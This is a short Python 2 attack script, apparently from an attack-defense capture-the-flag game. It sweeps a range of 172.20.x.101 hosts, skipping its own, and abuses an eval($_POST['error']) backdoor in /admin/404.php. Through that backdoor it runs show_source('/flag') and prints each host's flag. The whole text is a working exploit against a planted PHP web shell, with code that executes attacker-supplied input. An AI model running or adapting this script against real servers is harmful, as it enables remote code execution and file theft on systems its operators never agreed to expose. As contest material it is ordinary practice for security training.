
import requests
url="http://172.20.%d.101/admin/404.php"
# eval($_POST['error']);
for i in xrange(101,131,1):
    try:
        if i!=120: #not local
            x=requests.post(url%(i),data={'error':'show_source(\'/flag\');'},timeout=3)
            print '172.20.%d.101'%(i),x.content #get the ip and flag content
    except:
        print i
        pass
